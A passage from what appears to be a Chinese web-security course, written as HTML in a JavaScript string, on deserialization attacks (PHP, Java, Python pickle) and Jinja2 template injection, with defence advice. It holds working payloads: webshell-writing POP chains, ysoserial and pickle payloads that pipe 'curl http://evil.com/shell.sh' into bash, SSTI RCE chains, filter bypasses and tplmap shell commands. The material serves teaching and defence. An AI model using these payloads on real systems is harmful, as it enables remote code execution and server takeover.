(UserInfo对象)\n//   -&gt; UserInfo::__toString()\n//   -&gt; $this-&gt;profile-&gt;render() 这里 profile 实际上指向 Logger\n//   -&gt; Logger::__destruct()\n//   -&gt; file_put_contents(攻击者控制的路径, 攻击者控制的内容)\n\n$logger = new Logger(\"/var/www/html/shell.php\", '&lt;?php system($_GET[\"cmd\"]); ?&gt;');\n$userInfo = new UserInfo();\n$userInfo-&gt;name = \"test\";\n$userInfo-&gt;profile = $logger;\n\n$template = new Template(\"\", $userInfo);\n$payload = serialize($template);\necho urlencode($payload);\n// 反序列化时链条自动触发，WebShell 被写入 shell.php\n?&gt;</code></pre></div>\n\n<div class=\"callout default\"><div class=\"callout-title\">POP Chain 分析技巧</div><p>在真实的代码审计中，项目可能包含数百个类，手动寻找 POP Chain 非常困难。推荐使用 <strong>PHPGGC</strong>（PHP Generic Gadget Chains）工具，它类似于 Java 领域的 ysoserial，内置了 Laravel、Symfony、WordPress、Drupal 等常见框架的现成利用链。命令示例：<code>php phpggc.phar Laravel/RCE1 system id</code></p></div>\n\n<h4>PHP 反序列化的其他入口点</h4>\n\n<p>除了直接从 Cookie 反序列化，PHP 中还有多个可能的入口：</p>\n\n<ul>\n<li><strong>Session 反序列化</strong>：PHP 的 Session 处理器（如 <code>php_serialize</code>）内部使用序列化机制。如果 Session ID 可预测或可控制，攻击者可能注入恶意数据</li>\n<li><strong>缓存系统</strong>：Memcached、Redis 中存储的序列化数据如果可被篡改（如通过 SSRF），也能触发反序列化漏洞</li>\n<li><strong>数据库存储</strong>：某些 ORM 框架将复杂对象序列化后存入数据库字段，如果数据在存入前未经验证，后续读取时可能触发漏洞</li>\n<li><strong>SOAP/REST API</strong>：处理 XML 或自定义格式的 API 接口可能隐式使用反序列化</li>\n</ul>\n\n<h4>漏洞示例：一个有缺陷的 CMS 系统</h4>\n\n<p>CyberShop 的后台 CMS 系统有一个用户偏好设置功能，它将用户的界面偏好序列化后存储在 Cookie 中：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-php\">&lt;?php\nclass UserPreference {\n    public $theme;\n    public $language;\n    public $custom_css;\n\n    // 反序列化后自动加载自定义样式\n    public function __wakeup() {\n        if ($this-&gt;custom_css) {\n            $this-&gt;loadCSS($this-&gt;custom_css);\n        }\n    }\n\n    private function loadCSS($path) {\n        // 从指定路径加载 CSS 文件\n        include($path);  // 危险的 include！\n    }\n\n    public function __destruct() {\n        // 对象销毁时写日志\n        if ($this-&gt;theme) {\n            file_put_contents(\"/var/log/theme.log\",\n                \"User selected theme: \" . $this-&gt;theme);\n        }\n    }\n}\n\n// 从 Cookie 中读取用户偏好并反序列化\n$pref_cookie = $_COOKIE['user_pref'];\nif ($pref_cookie) {\n    $pref = unserialize($pref_cookie);  // 漏洞！直接反序列化用户输入\n}\n?&gt;</code></pre></div>\n\n<h4>构造攻击载荷</h4>\n\n<p>攻击者发现这个漏洞后，可以构造一个恶意的序列化字符串，让 <code>custom_css</code> 指向一个 WebShell：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-php\">&lt;?php\n// 攻击者构造恶意对象\nclass UserPreference {\n    public $theme = \"\";\n    public $language = \"\";\n    public $custom_css = \"http://evil.com/shell.php\";\n    // __wakeup() 会自动调用 loadCSS(\"http://evil.com/shell.php\")\n    // 导致 include(\"http://evil.com/shell.php\") → 远程代码执行！\n}\n\n$malicious = serialize(new UserPreference());\necho $malicious;\n// 输出: O:14:\"UserPreference\":3:{s:5:\"theme\";s:0:\"\";s:8:\"language\";s:0:\"\";s:10:\"custom_css\";s:26:\"http://evil.com/shell.php\";}\n?&gt;</code></pre></div>\n\n<p>然后攻击者将这段序列化字符串设置到 Cookie 中：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 curl 发送恶意 Cookie\ncurl -b 'user_pref=O:14:\"UserPreference\":3:{s:5:\"theme\";s:0:\"\";s:8:\"language\";s:0:\"\";s:10:\"custom_css\";s:26:\"http://evil.com/shell.php\";}' \\\n  https://cybershop.com/admin/dashboard.php</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">注意</div><p>上面的例子展示了攻击链的核心逻辑。在实际利用中，<code>include()</code> 远程文件需要 PHP 配置 <code>allow_url_include = On</code>。如果该选项关闭，攻击者需要寻找其他的利用链，例如通过 <code>__destruct()</code> 中的 <code>file_put_contents()</code> 写入 WebShell。</p></div>\n\n<h4>更隐蔽的攻击链：利用 __destruct() 写文件</h4>\n\n<p>如果远程包含不可用，攻击者可以转向 <code>__destruct()</code> 方法中的 <code>file_put_contents()</code>：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-php\">&lt;?php\n// 利用 __destruct() 写入 WebShell\nclass UserPreference {\n    public $theme = '&lt;?php system($_GET[\"cmd\"]); ?&gt;';\n    // __destruct() 会执行:\n    // file_put_contents(\"/var/log/theme.log\", \"User selected theme: <?php system($_GET['cmd']); ?>\")\n    // 日志文件中就包含了 WebShell 代码！\n}\n\n// 然后攻击者访问 /var/log/theme.log 来执行命令\n// https://cybershop.com/../../var/log/theme.log?cmd=id\n?&gt;</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h3>Java 反序列化漏洞</h3>\n\n<p>Java 的反序列化漏洞影响范围更广，危害也更大。Java 的 <code>ObjectInputStream.readObject()</code> 在反序列化时会自动调用某些类的方法，如果项目的依赖库中存在可被利用的类链（Gadget Chain），攻击者就能实现远程代码执行（RCE）。</p>\n\n<h4>Java 反序列化的危险之处</h4>\n\n<p>与 PHP 不同，Java 反序列化漏洞有以下特点：</p>\n\n<ul>\n<li><strong>无需特殊魔术方法</strong>：Java 的 <code>readObject()</code> 会递归地反序列化整个对象图，任何实现了 <code>Serializable</code> 接口的类都可能被利用</li>\n<li><strong>依赖库即武器</strong>：攻击者不需要目标应用本身的代码有漏洞，只要依赖库（如 Apache Commons Collections）中存在可利用的类链即可</li>\n<li><strong>攻击面广泛</strong>：任何接受序列化数据的接口都可能是攻击入口——RMI、JMX、HTTP 请求、消息队列等</li>\n</ul>\n\n<h4>Apache Commons Collections 利用链（简化版）</h4>\n\n<p>Apache Commons Collections 是一个非常常用的 Java 工具库。在 3.x 版本中，它的 <code>InvokerTransformer</code> 类可以通过反序列化链触发任意方法调用：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-java\">// 正常用途：InvokerTransformer 用于对象转换\n// 被滥用时：可以通过反射调用任意方法\n\n// 简化的利用链逻辑（仅供理解原理）：\n// 1. LazyMap.get(key) → 当 key 不存在时调用 factory.transform(key)\n// 2. ChainedTransformer.transform() → 依次调用链中的每个 Transformer\n// 3. InvokerTransformer.transform() → 通过反射调用目标方法\n// 4. 最终调用 Runtime.getRuntime().exec(\"恶意命令\")\n\n// 攻击载荷的构造思路：\nTransformer[] transformers = new Transformer[] {\n    new ConstantTransformer(Runtime.class),\n    new InvokerTransformer(\"getMethod\",\n        new Class[]{String.class, Class[].class},\n        new Object[]{\"getRuntime\", new Class[0]}),\n    new InvokerTransformer(\"invoke\",\n        new Class[]{Object.class, Object[].class},\n        new Object[]{null, new Object[0]}),\n    new InvokerTransformer(\"exec\",\n        new Class[]{String.class},\n        new Object[]{\"curl http://evil.com/shell.sh | bash\"})\n};\n\n// 将 transformers 链包装进 LazyMap，再序列化\n// 目标反序列化时，readObject() 触发整个链条执行</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>实际利用中，攻击者通常使用现成的工具来生成序列化载荷，例如 <strong>ysoserial</strong>。它内置了数十条利用链，覆盖了 Apache Commons Collections、Spring、Hibernate 等常见库。命令示例：<code>java -jar ysoserial.jar CommonsCollections1 \"whoami\" > payload.bin</code></p></div>\n\n<h4>Java 反序列化攻击场景</h4>\n\n<p>CyberShop 的订单系统使用 Java 编写，其中一个 API 接口接受 Base64 编码的序列化对象来恢复用户的会话状态：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-java\">@PostMapping(\"/api/session/restore\")\npublic ResponseEntity&lt;?&gt; restoreSession(@RequestBody String encodedSession) {\n    byte[] sessionData = Base64.getDecoder().decode(encodedSession);\n    ObjectInputStream ois = new ObjectInputStream(\n        new ByteArrayInputStream(sessionData));\n\n    // 漏洞！直接反序列化用户提供的数据\n    SessionState state = (SessionState) ois.readObject();\n\n    return ResponseEntity.ok(\"Session restored for: \" + state.getUsername());\n}</code></pre></div>\n\n<p>攻击者使用 ysoserial 生成载荷，然后通过 HTTP 请求发送：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 生成恶意序列化载荷\njava -jar ysoserial.jar CommonsCollections5 \"bash -c {curl,evil.com/shell.sh|bash}\" | base64 > payload.b64\n\n# 发送攻击请求\nPAYLOAD=$(cat payload.b64)\ncurl -X POST https://cybershop.com/api/session/restore \\\n  -H \"Content-Type: application/octet-stream\" \\\n  -d \"$PAYLOAD\"</code></pre></div>\n\n<h3>Python Pickle 反序列化</h3>\n\n<p>Python 的 <code>pickle</code> 模块是另一个高风险的反序列化工具。与 Java 和 PHP 不同，<code>pickle</code> 的文档本身就明确警告它是不安全的：</p>\n\n<blockquote><p><em>\"The pickle module is not secure. Only unpickle data you trust.\"</em> — Python 官方文档</p></blockquote>\n\n<h4>为什么 pickle 如此危险？</h4>\n\n<p><code>pickle</code> 的反序列化过程实际上是一个<strong>虚拟机执行过程</strong>。序列化数据中包含一系列\"操作码\"（opcodes），<code>pickle.loads()</code> 会按照这些操作码依次执行操作，包括：</p>\n\n<ul>\n<li>导入模块（<code>IMPORT</code> 操作码）</li>\n<li>调用函数（<code>REDUCE</code> 操作码）</li>\n<li>执行任意 Python 代码</li>\n</ul>\n\n<p>这意味着攻击者可以通过构造恶意的 pickle 数据来执行任意系统命令：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import pickle\nimport os\n\n# 恶意类：反序列化时执行系统命令\nclass MaliciousPayload:\n    def __reduce__(self):\n        # __reduce__ 告诉 pickle 如何重建这个对象\n        # 返回 (可调用对象, 参数元组)\n        # pickle.loads() 时会执行: os.system(\"恶意命令\")\n        return (os.system, (\"curl http://evil.com/shell.sh | bash\",))\n\n# 生成恶意 pickle 数据\npayload = pickle.dumps(MaliciousPayload())\n\n# 当服务器端执行 pickle.loads(payload) 时\n# → os.system(\"curl http://evil.com/shell.sh | bash\") 被执行\n# → 攻击者获得服务器控制权！</code></pre></div>\n\n<h4>真实场景：CyberShop 的机器学习 API</h4>\n\n<p>CyberShop 有一个商品推荐系统，它使用 pickle 来缓存训练好的模型。攻击者发现推荐模型是通过 API 上传更新的：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 服务器端代码（有漏洞）\nfrom flask import Flask, request\nimport pickle\n\napp = Flask(__name__)\n\n@app.route('/api/model/update', methods=['POST'])\ndef update_model():\n    # 接受上传的模型文件并反序列化\n    model_data = request.data\n    model = pickle.loads(model_data)  # 致命漏洞！\n\n    # 保存新模型\n    save_model(model)\n    return {\"status\": \"model updated\"}\n\n# 攻击者发送恶意 pickle 数据\n# POST /api/model/update\n# Body: pickle.dumps(MaliciousPayload())\n# → 服务器执行了恶意命令</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">注意</div><p>不仅是 <code>pickle</code>，Python 中的 <code>yaml.load()</code>（未使用 <code>SafeLoader</code>）、<code>marshal.loads()</code>、<code>shelve.open()</code> 等都可能存在类似的反序列化风险。记住一条原则：<strong>任何能够还原对象的反序列化函数都不应该处理不可信的数据。</strong></p></div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h3>真实世界中的反序列化漏洞</h3>\n\n<p>反序列化漏洞在真实世界中造成了大量严重的安全事件。以下是几个具有代表性的案例：</p>\n\n<h4>案例一：Apache Shiro 认证绕过与 RCE（CVE-2016-4437）</h4>\n\n<p>Apache Shiro 是一个广泛使用的 Java 安全框架。它的 \"记住我\"（Remember-Me）功能会将用户信息序列化并加密后存入 Cookie。但问题是——它的加密密钥是<strong>硬编码</strong>的：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-java\">// Shiro 1.2.4 及之前版本的默认密钥\n// 硬编码在 org.apache.shiro.mgt.AbstractRememberMeManager 中\nprivate static final byte[] DEFAULT_CIPHER_KEY_BYTES =\n    Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\");</code></pre></div>\n\n<p>由于密钥是公开的，攻击者可以：</p>\n<ol>\n<li>使用 ysoserial 生成恶意的序列化载荷</li>\n<li>使用硬编码密钥对载荷进行 AES-CBC 加密</li>\n<li>将加密后的载荷放入 RememberMe Cookie</li>\n<li>Shiro 解密并反序列化 Cookie → 执行恶意代码</li>\n</ol>\n\n<p>这个漏洞影响了数以万计的 Java Web 应用，被认为是 2016-2019 年间最严重的 Java 安全漏洞之一。</p>\n\n<h4>案例二：WebLogic 反序列化漏洞（CVE-2017-10271）</h4>\n\n<p>Oracle WebLogic 应用服务器的 WLS-WSAT 组件在处理 XML 数据时使用了 <code>readObject()</code> 反序列化。攻击者通过精心构造的 XML 请求就能实现远程代码执行，无需任何认证。该漏洞被大量勒索软件和挖矿木马利用。</p>\n\n<h4>案例三：Drupalgeddon（CVE-2014-3704 / CVE-2018-7600）</h4>\n\n<p>Drupal CMS 在处理用户输入的表单数据时，将不可信数据传入了 <code>unserialize()</code>。攻击者通过注册表单提交恶意的序列化字符串，就能在服务器上执行任意 PHP 代码。数百万个 Drupal 网站受到影响。</p>\n\n<div class=\"callout default\"><div class=\"callout-title\">延伸思考</div><p>这些案例有一个共同点：它们都不是应用程序本身的业务代码存在缺陷，而是<strong>依赖的框架或库</strong>中存在可被利用的反序列化入口。这提醒我们，安全不仅是写好业务代码，还需要持续关注和管理依赖组件的安全性。</p></div>\n\n<h3>防御反序列化攻击</h3>\n\n<p>了解了攻击方式后，我们需要系统地学习如何防御反序列化漏洞。以下是从根本到具体的防御策略：</p>\n\n<h4>原则一：不要反序列化不可信数据</h4>\n\n<p>这是最根本的防御原则。如果数据来源不可信，就不要对它进行反序列化。用更安全的数据交换格式替代：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-php\">&lt;?php\n// ❌ 危险：从 Cookie 反序列化\n$pref = unserialize($_COOKIE['user_pref']);\n\n// ✅ 安全：使用 JSON 格式\n$pref = json_decode($_COOKIE['user_pref'], true);\n// json_decode 不会触发任何类的方法，安全得多\n\n// ✅ 更安全：验证 JSON 数据的结构\nif (isset($pref['theme']) && in_array($pref['theme'], $allowed_themes)) {\n    $user_theme = $pref['theme'];\n}\n?&gt;</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># ❌ 危险：反序列化用户数据\nmodel = pickle.loads(user_uploaded_data)\n\n# ✅ 安全：使用 JSON 或 Protocol Buffers\nimport json\nmodel_config = json.loads(user_uploaded_data)\n\n# ✅ 更安全：使用专用的模型格式（如 ONNX、SafeTensors）\n# 这些格式在加载时不会执行任意代码</code></pre></div>\n\n<h4>原则二：如果必须反序列化，使用白名单机制</h4>\n\n<p>当业务逻辑确实需要反序列化复杂对象时，限制允许反序列化的类：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-php\">&lt;?php\n// PHP 7+ 的 allowed_classes 选项\n$safe_data = unserialize($input, [\n    \"allowed_classes\" => [\"UserPreference\", \"ThemeConfig\"]\n    // 只允许这两个类被反序列化\n    // 其他类会被转换为 __PHP_Incomplete_Class\n]);\n?&gt;</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-java\">// Java 的 ObjectInputFilter（JEP 290，Java 9+）\nObjectInputFilter filter = ObjectInputFilter.Config.createFilter(\n    \"com.cybershop.model.UserPreference;!*\"\n    // 只允许 UserPreference 类，拒绝其他所有类\n);\nois.setObjectInputFilter(filter);</code></pre></div>\n\n<h4>原则三：数据签名与完整性校验</h4>\n\n<p>对序列化数据进行签名，确保数据在传输过程中未被篡改：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hmac\nimport hashlib\nimport json\n\nSECRET_KEY = \"your-secret-key\"  # 使用强随机密钥\n\ndef sign_data(data_dict):\n    \"\"\"对数据进行签名\"\"\"\n    json_str = json.dumps(data_dict, sort_keys=True)\n    signature = hmac.new(SECRET_KEY.encode(), json_str.encode(),\n                         hashlib.sha256).hexdigest()\n    return {\"data\": json_str, \"signature\": signature}\n\ndef verify_and_load(signed_data):\n    \"\"\"验证签名后再加载数据\"\"\"\n    expected_sig = hmac.new(SECRET_KEY.encode(),\n                            signed_data[\"data\"].encode(),\n                            hashlib.sha256).hexdigest()\n    if not hmac.compare_digest(expected_sig, signed_data[\"signature\"]):\n        raise ValueError(\"数据签名无效，可能被篡改！\")\n    return json.loads(signed_data[\"data\"])</code></pre></div>\n\n<h4>原则四：持续监控与更新</h4>\n\n<ul>\n<li>使用 <strong>SCA（软件成分分析）</strong>工具扫描项目依赖中的已知漏洞</li>\n<li>定期更新 Apache Commons Collections、Spring、Jackson 等常用库</li>\n<li>对反序列化相关的异常进行日志记录和告警</li>\n<li>在生产环境使用 <strong>RASP（运行时应用自保护）</strong>技术检测和阻止反序列化攻击</li>\n</ul>\n\n<div class=\"callout success\"><div class=\"callout-title\">防御要点总结</div>\n<p>反序列化攻击的防御可以总结为四个层次：<br>\n<strong>1. 避免</strong>：尽量使用 JSON、Protocol Buffers 等安全格式<br>\n<strong>2. 限制</strong>：如果必须反序列化，严格限制允许的类<br>\n<strong>3. 验证</strong>：对序列化数据进行签名和完整性校验<br>\n<strong>4. 监控</strong>：持续扫描依赖漏洞，部署运行时防护</p></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h3>实战练习</h3>\n\n<p>通过以下挑战来检验你对反序列化攻击的理解：</p>\n\n<ul>\n<li>\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF('ctf-016')\"><span class=\"arrow\">▶</span> CTF挑战: PHP反序列化迷宫</button>\n<p>目标：利用 CyberShop 后台的 PHP 反序列化漏洞，构造 POP 链获取 Flag。你需要分析源码中的类关系，找到正确的利用链。</p>\n</li>\n<li>\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF('prac-09')\"><span class=\"arrow\">▶</span> 实践任务: Pickle陷阱</button>\n<p>目标：在一个 Python Flask 应用中，发现并利用 pickle 反序列化漏洞执行系统命令，获取服务器上的 flag.txt 文件内容。</p>\n</li>\n</ul>\n\n<div class=\"callout info\"><div class=\"callout-title\">学习建议</div><p>在动手之前，建议先在本地搭建一个安全的测试环境练习 PHP 和 Python 的反序列化攻击。理解魔术方法和 <code>__reduce__</code> 的触发时机是掌握反序列化攻击的关键。对于 Java 反序列化，建议阅读 Chris Frohoff 的 ysoserial 项目文档来深入理解 Gadget Chain 的构造原理。</p></div>\n\n---SECTION_BREAK---\n\n<!-- ============================================================= -->";
+
+SECTION_CONTENT["web-07-01"] = "<!-- ============================================================= -->\n\n<div class=\"section-transition\"><p>上一章我们了解了反序列化如何让服务器\"自己执行\"恶意代码。本节我们将看到另一种让服务器执行任意代码的方式——当用户输入直接进入<strong>模板引擎</strong>时，攻击者可以利用模板语法执行服务器端代码。</p></div>\n\n<h2>SSTI 模板注入</h2>\n<p><strong>主题：模板引擎变成了后门</strong></p>\n\n<p>现代 Web 应用广泛使用模板引擎来动态生成 HTML 页面。模板引擎允许开发者在 HTML 中嵌入变量和逻辑控制语句，然后在服务器端将数据填充到模板中渲染出最终的页面。然而，当<strong>用户的输入</strong>被直接嵌入到模板中并被引擎渲染时，攻击者就可以利用模板语法执行服务器端的任意代码——这就是<strong>服务器端模板注入（Server-Side Template Injection, SSTI）</strong>。</p>\n\n<h3>场景：CyberShop 的个性化欢迎页</h3>\n\n<p>CyberShop 使用了 Jinja2 模板引擎（Python/Flask 应用的默认模板引擎）。为了提供个性化的用户体验，开发者将用户名直接嵌入到了欢迎页的模板中：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/welcome')\ndef welcome():\n    username = request.args.get('username', 'Guest')\n    # ❌ 危险！用户输入直接拼接到模板字符串中\n    template = f'''\n    &lt;html&gt;\n    &lt;body&gt;\n        &lt;h1&gt;欢迎回来，{username}！&lt;/h1&gt;\n        &lt;p&gt;您的 CyberShop 账户一切正常。&lt;/p&gt;\n    &lt;/body&gt;\n    &lt;/html&gt;\n    '''\n    return render_template_string(template)</code></pre></div>\n\n<p>表面上看，这只是一个简单的变量插入。但如果攻击者在 <code>username</code> 参数中传入模板代码呢？</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 正常请求\ncurl \"https://cybershop.com/welcome?username=Alice\"\n# 页面显示: 欢迎回来，Alice！\n\n# 攻击请求：注入模板代码\ncurl \"https://cybershop.com/welcome?username={{7*7}}\"\n# 如果页面显示: 欢迎回来，49！\n# → 说明存在 SSTI 漏洞！服务器执行了 7*7 的计算</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>注意区分 <strong>SSTI</strong> 和 <strong>XSS</strong>。XSS 是客户端攻击——恶意脚本在用户的浏览器中执行；SSTI 是服务器端攻击——恶意代码在服务器上执行，危害远大于 XSS。如果 <code>{{7*7}}</code> 在页面上原样显示（而不是显示 49），则可能只是 XSS 而非 SSTI。</p></div>\n\n<h3>检测 SSTI 漏洞</h3>\n\n<p>不同的 Web 框架使用不同的模板引擎，每种引擎有自己的语法。检测 SSTI 的第一步是<strong>确定目标使用的模板引擎</strong>：</p>\n\n<h4>通用检测方法</h4>\n\n<p>通过发送不同的表达式并观察返回结果，可以判断后端使用的模板引擎：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 测试 payloads —— 逐个尝试\n\n# 1. Jinja2 / Twig（双大括号语法）\ncurl \"https://target.com/page?input={{7*7}}\"\n# 期望结果：49\n\n# 2. Smarty（PHP 模板引擎）\ncurl \"https://target.com/page?input={7*7}\"\n# 期望结果：49\n\n# 3. Freemarker（Java 模板引擎）\ncurl \"https://target.com/page?input=${7*7}\"\n# 期望结果：49\n\n# 4. Thymeleaf / Spring（Java）\ncurl \"https://target.com/page?input=${7*7}\"\n\n# 5. Velocity（Java）\ncurl \"https://target.com/page?input=#set($x=7*7)$x\"\n# 期望结果：49\n\n# 6. Ruby ERB\ncurl \"https://target.com/page?input=<%=7*7%>\"\n# 期望结果：49\n\n# 7. Pug / Jade（Node.js）\ncurl \"https://target.com/page?input=#{7*7}\"\n# 期望结果：49</code></pre></div>\n\n<h4>模板引擎指纹识别</h4>\n\n<p>如果上面的简单测试不够，可以使用更精确的\"指纹\"来识别模板引擎：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用一个无效变量，观察错误信息的格式\n\n# Jinja2 的错误通常包含 Python 风格的追踪信息\ncurl \"https://target.com/page?input={{undefined_var}}\"\n\n# Twig 的错误可能为空或显示空字符串\ncurl \"https://target.com/page?input={{undefined_var}}\"\n\n# Smarty 可能在错误中包含 PHP 文件路径\ncurl \"https://target.com/page?input={$undefined_var}\"\n\n# 利用数学运算来精确识别\n# Jinja2: {{7*'7'}} → 7777777（字符串重复）\n# Twig:   {{7*'7'}} → 49（类型转换后相乘）\n# 不同的结果说明不同的引擎！</code></pre></div>\n\n<div class=\"callout default\"><div class=\"callout-title\">SSTI 检测流程</div>\n<p>\n<strong>第一步</strong>：发送普通文本（如 \"hello\"），确认输入被正常渲染<br>\n<strong>第二步</strong>：发送数学表达式（如 <code>{{7*7}}</code>），检查是否被计算<br>\n<strong>第三步</strong>：如果表达式被计算，使用指纹 payload 确定模板引擎类型<br>\n<strong>第四步</strong>：根据引擎类型选择对应的利用链\n</p></div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h3>Jinja2 模板注入利用链</h3>\n\n<p>Jinja2 是 Python 生态中最常用的模板引擎（Flask、Django 的部分场景、Ansible 等都使用它）。当确认目标是 Jinja2 后，攻击者可以利用 Python 的对象继承链来执行任意系统命令。</p>\n\n<h4>第一步：信息收集</h4>\n\n<p>首先获取应用的配置信息和环境变量：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 读取 Flask 配置（可能包含密钥、数据库连接串等敏感信息）\ncurl \"https://cybershop.com/welcome?username={{config}}\"\n# 输出类似: &lt;Config {'SECRET_KEY': 'sup3r_s3cret_k3y', 'DEBUG': False, ...}&gt;\n\n# 读取环境变量\ncurl \"https://cybershop.com/welcome?username={{config.items()}}\"\n\n# 读取 self 对象的信息\ncurl \"https://cybershop.com/welcome?username={{self.__dict__}}\"</code></pre></div>\n\n<h4>第二步：利用 Python 对象链实现 RCE</h4>\n\n<p>Jinja2 模板中可以访问 Python 对象的属性和方法。利用 Python 的类继承机制，攻击者可以从任意对象\"爬\"到可以执行命令的类：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 核心利用链原理：\n# 任意字符串对象 → __class__ → __mro__ → object → __subclasses__()\n# → 找到 os 或 subprocess 相关的类 → 执行命令\n\n# 1. 获取字符串对象的类\n{{''.__class__}}\n# → &lt;class 'str'&gt;\n\n# 2. 获取方法解析顺序（MRO）\n{{''.__class__.__mro__}}\n# → (&lt;class 'str'&gt;, &lt;class 'object'&gt;)\n\n# 3. 获取 object 的所有子类\n{{''.__class__.__mro__[1].__subclasses__()}}\n# → 返回所有已加载的子类列表\n\n# 4. 找到包含 os.popen 的类（通常是 file 或 _wrap_close 等）\n# 索引号需要根据实际环境探测，常见的位置：\n{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}\n# → 读取服务器上的 /etc/passwd 文件</code></pre></div>\n\n<h4>第三步：执行系统命令</h4>\n\n<p>一旦找到合适的子类，就可以执行任意命令：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 方法一：通过 os.popen 执行命令\n{{''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['popen']('id').read()}}\n\n# 方法二：通过 __import__ 直接导入 os 模块\n{{''.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}\n\n# 方法三：利用 request 对象（Flask 特有）\n{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}\n\n# 方法四：利用 lipsum 全局对象\n{{lipsum.__globals__['os'].popen('whoami').read()}}\n\n# 方法五：利用 cycler 全局对象\n{{cycler.__init__.__globals__.os.popen('id').read()}}</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">注意</div><p>上面示例中的 <code>[XXX]</code> 索引号需要根据目标环境动态确定。不同 Python 版本和已加载的模块会导致子类列表不同。攻击者通常先执行 <code>{{''.__class__.__mro__[1].__subclasses__()}}</code> 来列出所有子类，然后人工找到可用的类。</p></div>\n\n<h4>绕过 Jinja2 过滤器</h4>\n\n<p>有些应用会对用户输入进行简单的过滤，比如禁止使用特定关键词。攻击者有多种绕过方式：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 过滤了 \"__class__\" 关键词？\n\n# 绕过方式一：使用 attr 过滤器\n{{''|attr('__class__')}}\n\n# 绕过方式二：使用 request.args 传参\n# URL: ?input={{''|attr(request.args.a)}}&a=__class__\n\n# 绕过方式三：字符串拼接\n{% set c = '__cl' + 'ass__' %}\n{{''|attr(c)}}\n\n# 过滤了 \"__\" (双下划线)？\n\n# 绕过方式四：使用 request.args\n{{''[request.args.key]}}&key=__class__\n\n# 绕过方式五：使用 chr() 构造字符\n{{''[request.args.a]}}&a={{['__cl','ass__']|join}}\n\n# 过滤了 \"[]\" (方括号)？\n\n# 绕过方式六：使用 __getitem__\n{{''.__class__.__mro__.__getitem__(1)}}</code></pre></div>\n\n<h4>自动化 SSTI 利用工具</h4>\n\n<p>手动构造 SSTI 利用链既繁琐又容易出错。安全研究人员开发了多个自动化工具来简化这个过程：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># Tplmap - 最流行的 SSTI 自动化检测和利用工具\n# 安装\ngit clone https://github.com/epinna/tplmap.git\ncd tplmap && pip install -r requirements.txt\n\n# 基本检测 - 自动识别模板引擎并尝试利用\npython3 tplmap.py -u \"https://cybershop.com/welcome?username=*\"\n\n# 指定参数进行测试\npython3 tplmap.py -u \"https://cybershop.com/welcome?username=INJECT_HERE\" --level 5\n\n# 获取反向 Shell\npython3 tplmap.py -u \"https://cybershop.com/welcome?username=*\" --os-shell\n\n# 执行单条命令\npython3 tplmap.py -u \"https://cybershop.com/welcome?username=*\" --eval \"import os; os.popen('id').read()\"\n\n# SSTImap (Tplmap 的维护分支，支持更多引擎)\ngit clone https://github.com/n00b-bot/SSTImap.git\npython3 sstimap.py -u \"https://target.com/page?input=*\" -i</code></pre></div>\n\n<h4>Jinja2 SSTI 速查表</h4>\n\n<p>以下是在不同场景下常用的 Jinja2 利用 Payload 汇总，方便在实战中快速参考：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># === 信息收集 ===\n{{config}}                    # Flask 配置信息\n{{config.items()}}            # 